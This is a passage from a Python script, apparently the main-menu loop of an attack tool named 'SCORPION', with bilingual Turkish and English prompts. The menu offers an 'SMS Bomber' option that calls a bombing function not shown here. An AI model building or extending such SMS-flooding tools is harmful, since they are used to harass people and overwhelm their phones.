            main_menu = input(f"{Fore.MAGENTA + Style.BRIGHT + Back.BLACK}╔═[ {Fore.WHITE}SCORPION MAIN MENU{Fore.MAGENTA} ]═╗{Style.RESET_ALL}\n"
                              f"{Fore.CYAN + Style.BRIGHT}║{Fore.WHITE} 1. {Fore.GREEN}SMS Bomber{Fore.WHITE} ║{Style.RESET_ALL}\n"
                              f"{Fore.CYAN}║{Fore.WHITE} 2. {Fore.YELLOW}Gelecek Araçlar... (Coming Soon){Fore.WHITE} ║{Style.RESET_ALL}\n"
                              f"{Fore.CYAN}║{Fore.WHITE} 3. {Fore.RED}Çıkış / Exit{Fore.WHITE} ║{Style.RESET_ALL}\n"
                              f"{Fore.MAGENTA + Style.BRIGHT}╚{'═' * 48}╝{Style.RESET_ALL}\n\n"
                              f"{Fore.YELLOW + Style.BRIGHT}Seçimini Yap / Choose: {Fore.GREEN}")
            if main_menu == "":
                continue
            main_menu = int(main_menu)
        except ValueError:
            print(f"{Fore.RED + Style.BRIGHT}❌ Hatalı Giriş! Lütfen Sayı Giriniz. / Invalid Input! Please Enter a Number.{Style.RESET_ALL}")
            sleep(3)
            continue
        
        if main_menu == 1:
            sms_bomber_menu(token_manager)
        elif main_menu == 2:
            print(f"{Fore.YELLOW + Style.BRIGHT}⏳ Gelecek araçlar yakında eklenecek! / Coming soon!{Style.RESET_ALL}")
            sleep(3)
        elif main_menu == 3:
            print(f"{Fore.RED + Style.BRIGHT}👋 Çıkış Yapılıyor... / Exiting...{Style.RESET_ALL}")
            sleep(2)
            sys.exit(0)
        else:
            print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz Seçim! / Invalid Choice!{Style.RESET_ALL}")
            sleep(3)

if __name__ == "__main__":
    main()
